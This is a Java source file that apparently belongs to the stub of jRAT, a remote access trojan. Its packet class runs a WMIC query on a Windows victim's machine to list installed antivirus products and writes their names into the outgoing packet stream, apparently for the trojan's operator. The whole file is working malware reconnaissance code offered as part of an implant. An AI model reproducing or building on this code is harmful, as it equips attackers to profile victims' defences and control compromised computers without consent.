package se.jrat.stub.packets.outgoing;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import se.jrat.common.io.StringWriter;

import com.redpois0n.oslib.OperatingSystem;


public class Packet69InitAntivirus extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		List<String> antiviruses = new ArrayList<String>();

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS && !System.getProperty("os.name").toLowerCase().contains("xp")) {
			try {
				Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/node:localhost", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "/format:list" });

				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					if (line.trim().startsWith("displayName")) {
						antiviruses.add(line.trim().split("=")[1]);
					}
				}

				reader.close();

			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		dos.writeInt(antiviruses.size());

		for (int i = 0; i < antiviruses.size(); i++) {
			sw.writeLine(antiviruses.get(i));
		}
	}

	@Override
	public byte getPacketId() {
		return 69;
	}

}
